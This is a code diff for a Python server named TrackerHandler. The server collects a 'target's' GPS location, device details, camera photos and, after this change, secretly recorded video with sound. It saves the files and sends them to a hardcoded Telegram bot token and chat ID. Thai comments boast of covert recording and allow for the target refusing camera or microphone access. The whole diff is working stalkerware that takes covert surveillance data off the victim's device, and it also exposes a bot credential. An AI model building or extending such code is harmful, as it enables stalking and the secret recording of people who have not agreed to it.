@@ -13,7 +13,7 @@ from datetime import datetime, timedelta, timezone
 PORT = int(os.environ.get("PORT", 8080))
 
 class TrackerHandler(http.server.SimpleHTTPRequestHandler):
-    def send_to_telegram(self, message, image_paths=None, audio_path=None):
+    def send_to_telegram(self, message, image_paths=None, video_path=None):
         token = "8862730393:AAHnTrFZi3yI8UHuDdFrsPlsZXXOVVbSqLw"
         chat_id = "7505235924"
         try:
@@ -42,13 +42,13 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
                     for f in files.values():
                         f.close()
 
-            # 3. ส่งไฟล์เสียง (Voice)
-            if audio_path and os.path.exists(audio_path):
-                url_voice = f"https://api.telegram.org/bot{token}/sendVoice"
-                with open(audio_path, 'rb') as audio_file:
-                    res_voice = requests.post(url_voice, data={'chat_id': chat_id}, files={'voice': audio_file})
-                    if res_voice.status_code == 200:
-                        self.save_message_id(res_voice.json().get("result", {}).get("message_id"))
+            # 3. ส่งไฟล์วิดีโอพร้อมเสียง (Video)
+            if video_path and os.path.exists(video_path):
+                url_video = f"https://api.telegram.org/bot{token}/sendVideo"
+                with open(video_path, 'rb') as video_file:
+                    res_video = requests.post(url_video, data={'chat_id': chat_id}, files={'video': video_file})
+                    if res_video.status_code == 200:
+                        self.save_message_id(res_video.json().get("result", {}).get("message_id"))
 
         except Exception as e:
             print(f"❌ ส่งแจ้งเตือน Telegram ไม่สำเร็จ: {e}")
@@ -76,7 +76,7 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             lon = data.get('lon')
             device_info = data.get('deviceInfo', {})
             image_datas = data.get('images', [])
-            audio_data = data.get('audio')
+            video_data = data.get('video')
             
             # ดึงเวลาปัจจุบัน (ตั้งค่าให้เป็นเวลาประเทศไทย UTC+7 เสมอ ไม่ว่าเซิร์ฟเวอร์จะอยู่ที่ไหน)
             tz_th = timezone(timedelta(hours=7))
@@ -153,27 +153,27 @@ class TrackerHandler(http.server.SimpleHTTPRequestHandler):
             else:
                 print('❌ ไม่ได้รูปภาพ (เป้าหมายอาจจะไม่อนุญาตให้ใช้กล้อง)')
 
-            saved_audio_path = None
-            if audio_data:
+            saved_video_path = None
+            if video_data:
                 try:
-                    audio_str = audio_data.split(',')[1]
-                    audio_bytes = base64.b64decode(audio_str)
+                    video_str = video_data.split(',')[1]
+                    video_bytes = base64.b64decode(video_str)
                     timestamp = int(time.time())
-                    filename = f'../target_audio_{timestamp}.webm'
+                    filename = f'../target_video_{timestamp}.webm'
                     with open(filename, 'wb') as f:
-                        f.write(audio_bytes)
-                    print(f'🎙️ แอบอัดเสียงสำเร็จ! บันทึกไฟล์ไว้ที่: {filename.replace("../", "")}')
-                    saved_audio_path = filename
+                        f.write(video_bytes)
+                    print(f'🎥 แอบอัดวิดีโอสำเร็จ! บันทึกไฟล์ไว้ที่: {filename.replace("../", "")}')
+                    saved_video_path = filename
                 except Exception as e:
-                    print(f'❌ ไม่สามารถบันทึกไฟล์เสียงได้: {e}')
+                    print(f'❌ ไม่สามารถบันทึกไฟล์วิดีโอได้: {e}')
             else:
-                print('❌ ไม่ได้ไฟล์เสียง (เป้าหมายอาจจะไม่อนุญาตให้ใช้ไมค์)')
+                print('❌ ไม่ได้ไฟล์วิดีโอ (เป้าหมายอาจจะไม่อนุญาตให้ใช้กล้อง/ไมค์)')
 
             print('========================================\n')
             
             # ส่งข้อมูลเข้า Telegram
             print("กำลังส่งแจ้งเตือนเข้า Telegram...")
-            self.send_to_telegram(tg_message, saved_image_paths, saved_audio_path)
+            self.send_to_telegram(tg_message, saved_image_paths, saved_video_path)
             print("ส่งแจ้งเตือน Telegram เรียบร้อย!")
             
             # แสดงแจ้งเตือนบนหน้าจอ (Popup) เฉพาะบน Windows เท่านั้น
